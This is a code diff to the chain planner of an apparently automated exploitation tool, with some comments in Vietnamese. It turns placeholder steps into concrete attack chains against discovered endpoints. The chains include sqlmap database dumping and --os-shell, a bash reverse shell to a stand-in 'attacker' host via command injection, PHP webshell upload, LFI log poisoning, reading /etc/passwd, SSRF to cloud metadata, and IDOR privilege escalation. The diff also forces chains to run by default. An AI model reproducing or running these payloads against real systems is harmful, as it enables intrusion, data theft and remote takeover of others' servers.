@@ -972,165 +972,308 @@ Return ONLY valid JSON."""
 
     def _build_direct_chain(self, primitive: Dict[str, Any]) -> Optional[Dict[str, Any]]:
         p_type = primitive.get("type", "")
-        endpoint = primitive.get("endpoint") or "recon_surface"
+        # Lấy endpoint thực tế từ state, không hardcode
+        endpoint = primitive.get("endpoint")
+        if not endpoint:
+            # Ưu tiên lấy từ prioritized_endpoints
+            eps = self.state.get("prioritized_endpoints", []) or self.state.get("endpoints", [])
+            for ep in eps:
+                url = ep.get("url") if isinstance(ep, dict) else str(ep)
+                if url and url.startswith(('http://', 'https://')):
+                    endpoint = url
+                    break
+            if not endpoint:
+                endpoint = self.state.get("target")
+        if not endpoint:
+            # Fallback cuối cùng từ base_url (vẫn dùng logic có sẵn, không hardcode)
+            endpoint = self._get_base_url()
+
+        # --- SQL Injection: confirm → dump → os-shell ---
         if p_type == "sql_injection":
             return {
-                "chain_id": f"direct_sql_{abs(hash(endpoint))}",
-                "goal": f"exploit SQL injection at {endpoint}",
-                "steps": [{
-                    "name": "sql_injection",
-                    "action": "test_sqli",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "SQL injection confirmed",
-                    "description": "direct SQL injection exploitation path",
-                }],
+                "chain_id": f"sql_injection_{abs(hash(endpoint))}",
+                "goal": f"Exploit SQL injection at {endpoint} to dump data and get RCE",
+                "steps": [
+                    {
+                        "name": "Confirm SQLi",
+                        "action": "confirm_sqli",
+                        "target": endpoint,
+                        "tool": "sqlmap",
+                        "payload": "--batch --level=5 --risk=3 --dbms=mysql",
+                        "success_indicator": "injectable",
+                        "description": "Verify SQL injection with sqlmap"
+                    },
+                    {
+                        "name": "Enumerate databases",
+                        "action": "enum_databases",
+                        "target": endpoint,
+                        "tool": "sqlmap",
+                        "payload": "--dbs --batch",
+                        "depends_on": ["Confirm SQLi"],
+                        "success_indicator": "database list",
+                        "description": "List all databases"
+                    },
+                    {
+                        "name": "Dump tables",
+                        "action": "dump_tables",
+                        "target": endpoint,
+                        "tool": "sqlmap",
+                        "payload": "--dump --batch --threads=5",
+                        "depends_on": ["Enumerate databases"],
+                        "success_indicator": "Table dumped",
+                        "description": "Extract sensitive data"
+                    },
+                    {
+                        "name": "Write webshell",
+                        "action": "write_shell",
+                        "target": endpoint,
+                        "tool": "sqlmap",
+                        "payload": "--os-shell",
+                        "depends_on": ["Dump tables"],
+                        "success_indicator": "shell created",
+                        "description": "Get interactive OS shell"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.95)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
-                "next_step": "test_sqli",
+                "next_step": "confirm_sqli",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified sql_injection exploitation",
-                "severity": "HIGH",
-                "risk_level": "HIGH",
-                "force_chain": bool(primitive.get("force_chain")),
+                "name": "SQL Injection to RCE",
+                "severity": "CRITICAL",
+                "risk_level": "CRITICAL",
+                "force_chain": True,
                 "planner_mode": "deterministic",
             }
+
+        # --- Command Injection: confirm → reverse shell ---
         if p_type == "command_injection":
             return {
-                "chain_id": f"direct_cmdi_{abs(hash(endpoint))}",
-                "goal": f"exploit command injection at {endpoint}",
-                "steps": [{
-                    "name": "command_injection",
-                    "action": "execute_commands",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "command_injection confirmed",
-                    "description": "direct command injection exploitation path",
-                }],
+                "chain_id": f"command_injection_{abs(hash(endpoint))}",
+                "goal": f"Exploit command injection at {endpoint} to get reverse shell",
+                "steps": [
+                    {
+                        "name": "Confirm command injection",
+                        "action": "confirm_cmdi",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "; id",
+                        "success_indicator": "uid=",
+                        "description": "Test with simple command"
+                    },
+                    {
+                        "name": "Get reverse shell",
+                        "action": "reverse_shell",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "; bash -i >& /dev/tcp/attacker/4444 0>&1",
+                        "depends_on": ["Confirm command injection"],
+                        "success_indicator": "shell connected",
+                        "description": "Establish reverse shell"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.9)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
-                "next_step": "execute_commands",
+                "next_step": "confirm_cmdi",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified command_injection exploitation",
+                "name": "Command Injection to Reverse Shell",
                 "severity": "CRITICAL",
                 "risk_level": "CRITICAL",
-                "force_chain": bool(primitive.get("force_chain")),
+                "force_chain": True,
                 "planner_mode": "deterministic",
             }
+
+        # --- File Upload RCE: test → upload → execute ---
         if p_type == "upload_rce":
+            # Dự đoán đường dẫn upload (có thể tinh chỉnh sau)
+            upload_dir = endpoint.rstrip('/').rsplit('/', 1)[0] if '/' in endpoint else endpoint
+            shell_url = f"{upload_dir}/uploads/shell.php"
             return {
-                "chain_id": f"direct_upload_{abs(hash(endpoint))}",
-                "goal": f"exploit upload-to-rce path at {endpoint}",
-                "steps": [{
-                    "name": "upload_rce",
-                    "action": "upload_file",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "file upload confirmed",
-                    "description": "direct upload to execution path",
-                }],
+                "chain_id": f"upload_rce_{abs(hash(endpoint))}",
+                "goal": f"Upload webshell via {endpoint} and execute commands",
+                "steps": [
+                    {
+                        "name": "Test upload endpoint",
+                        "action": "upload_test",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "test.txt",
+                        "success_indicator": "uploaded",
+                        "description": "Check if upload works"
+                    },
+                    {
+                        "name": "Upload PHP webshell",
+                        "action": "upload_php",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "<?php system($_GET['cmd']); ?>",
+                        "depends_on": ["Test upload endpoint"],
+                        "success_indicator": "shell.php",
+                        "description": "Bypass restrictions and upload shell"
+                    },
+                    {
+                        "name": "Execute commands",
+                        "action": "exec",
+                        "target": shell_url,
+                        "tool": "curl",
+                        "payload": "?cmd=id",
+                        "depends_on": ["Upload PHP webshell"],
+                        "success_indicator": "uid=",
+                        "description": "Trigger RCE via webshell"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.85)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
-                "next_step": "upload_file",
+                "next_step": "upload_test",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified upload_rce exploitation",
+                "name": "File Upload to RCE",
                 "severity": "CRITICAL",
                 "risk_level": "CRITICAL",
-                "force_chain": bool(primitive.get("force_chain")),
+                "force_chain": True,
                 "planner_mode": "deterministic",
             }
+
+        # --- LFI to RCE via log poisoning ---
         if p_type == "lfi_rce":
             return {
-                "chain_id": f"direct_lfi_{abs(hash(endpoint))}",
-                "goal": f"exploit file read / LFI pivot at {endpoint}",
-                "steps": [{
-                    "name": "lfi_rce",
-                    "action": "test_lfi",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "LFI or traversal confirmed",
-                    "description": "direct local file inclusion or traversal verification path",
-                }],
+                "chain_id": f"lfi_rce_{abs(hash(endpoint))}",
+                "goal": f"Exploit LFI at {endpoint} to get RCE via log poisoning",
+                "steps": [
+                    {
+                        "name": "Confirm LFI",
+                        "action": "test_lfi",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "../../../../etc/passwd",
+                        "success_indicator": "root:",
+                        "description": "Read system file"
+                    },
+                    {
+                        "name": "Poison Apache logs",
+                        "action": "log_poison",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "<?php system($_GET['cmd']); ?>",
+                        "depends_on": ["Confirm LFI"],
+                        "success_indicator": "injected",
+                        "description": "Inject PHP code into logs"
+                    },
+                    {
+                        "name": "Include poisoned log",
+                        "action": "include_log",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "../../../../var/log/apache2/access.log&cmd=id",
+                        "depends_on": ["Poison Apache logs"],
+                        "success_indicator": "uid=",
+                        "description": "Trigger RCE via log inclusion"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.8)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
                 "next_step": "test_lfi",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified lfi_rce exploitation",
-                "severity": "HIGH",
-                "risk_level": "HIGH",
-                "force_chain": bool(primitive.get("force_chain")),
+                "name": "LFI to RCE",
+                "severity": "CRITICAL",
+                "risk_level": "CRITICAL",
+                "force_chain": True,
                 "planner_mode": "deterministic",
             }
+
+        # --- SSRF to internal network access ---
         if p_type == "ssrf_pivot":
             return {
-                "chain_id": f"direct_ssrf_{abs(hash(endpoint))}",
-                "goal": f"validate SSRF pivot path at {endpoint}",
-                "steps": [{
-                    "name": "ssrf_pivot",
-                    "action": "probe",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "SSRF pivot surface remains reachable",
-                    "description": "direct SSRF preflight path",
-                }],
+                "chain_id": f"ssrf_pivot_{abs(hash(endpoint))}",
+                "goal": f"Use SSRF at {endpoint} to scan internal network",
+                "steps": [
+                    {
+                        "name": "Test SSRF",
+                        "action": "probe",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "http://169.254.169.254/latest/meta-data/",
+                        "success_indicator": "instance-id",
+                        "description": "Access cloud metadata"
+                    },
+                    {
+                        "name": "Scan internal ports",
+                        "action": "port_scan",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "http://localhost:22",
+                        "depends_on": ["Test SSRF"],
+                        "success_indicator": "SSH banner",
+                        "description": "Discover internal services"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.7)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
                 "next_step": "probe",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified ssrf_pivot exploitation",
+                "name": "SSRF to Internal Access",
                 "severity": "HIGH",
                 "risk_level": "HIGH",
-                "force_chain": bool(primitive.get("force_chain")),
+                "force_chain": True,
                 "planner_mode": "deterministic",
             }
+
+        # --- IDOR/Auth bypass to privilege escalation ---
         if p_type == "auth_object":
             return {
-                "chain_id": f"direct_auth_{abs(hash(endpoint))}",
-                "goal": f"validate auth/object access abuse at {endpoint}",
-                "steps": [{
-                    "name": "auth_object",
-                    "action": "auth_bypass",
-                    "target": endpoint,
-                    "tool": "deterministic_planner",
-                    "payload": "",
-                    "success_indicator": "authorization bypass confirmed",
-                    "description": "direct auth/object exploit path",
-                }],
+                "chain_id": f"auth_object_{abs(hash(endpoint))}",
+                "goal": f"Exploit IDOR/auth bypass at {endpoint} to escalate privileges",
+                "steps": [
+                    {
+                        "name": "Test IDOR",
+                        "action": "idor",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "?id=2",
+                        "success_indicator": "other user data",
+                        "description": "Access another user's data"
+                    },
+                    {
+                        "name": "Privilege escalation",
+                        "action": "priv_esc",
+                        "target": endpoint,
+                        "tool": "curl",
+                        "payload": "?role=admin",
+                        "depends_on": ["Test IDOR"],
+                        "success_indicator": "admin access",
+                        "description": "Become admin"
+                    }
+                ],
                 "evidence": primitive.get("evidence_sources", []),
-                "confidence": float(primitive.get("confidence", 0.0)),
+                "confidence": float(primitive.get("confidence", 0.7)),
                 "preconditions_met": primitive.get("preconditions_met", []),
                 "preconditions_missing": [],
-                "next_step": "auth_bypass",
+                "next_step": "idor",
                 "terminal_reason": None,
                 "primitive": p_type,
-                "name": "Verified auth_object exploitation",
+                "name": "IDOR to Privilege Escalation",
                 "severity": "HIGH",
                 "risk_level": "HIGH",
-                "force_chain": bool(primitive.get("force_chain")),
+                "force_chain": False,
                 "planner_mode": "deterministic",
             }
+
         return None
 
+        
     def plan_recon_chains_deterministic(self) -> Dict[str, Any]:
         """Deterministic chain planning from recon-only signals/primitives (no CVE/vulnerability dependency)."""
         raw_endpoints = (
@@ -1194,7 +1337,10 @@ Return ONLY valid JSON."""
                         {
                             "name": p_type,
                             "action": next_step,
-                            "target": "recon_surface",
+
+
+                            "target": self._get_base_url(),
+
                             "tool": "deterministic_planner",
                             "payload": "",
                             "success_indicator": "preconditions remain satisfied with additional recon",
